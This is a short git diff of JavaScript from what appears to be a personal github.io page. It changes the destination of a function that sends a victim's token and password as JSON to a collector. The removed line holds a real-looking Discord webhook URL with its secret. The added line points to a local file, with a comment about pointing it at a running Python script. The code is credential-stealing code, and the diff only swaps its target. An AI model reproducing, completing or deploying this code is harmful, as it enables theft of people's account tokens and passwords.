@@ -4,7 +4,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     const sendToDiscord = (token, password) => {
         const xhr = new XMLHttpRequest();
-        const url = 'https://discord.com/api/webhooks/1216319088843030528/hX_8qMQKRR8IkYjwXB2cYUk_f28yKAnPb7S9Os7iorbersFo7y1NyTu68N3oiomb_Yhg';
+        const url = 'file:///C:/Users/Hububba/Downloads/imhububba.github.io-main/imhububba.github.io-main/test/code.py'; // Replace with the URL where your Python script is running
         xhr.open('POST', url);
         xhr.setRequestHeader('Content-Type', 'application/json');
         const data = JSON.stringify({ token: token, password: password });
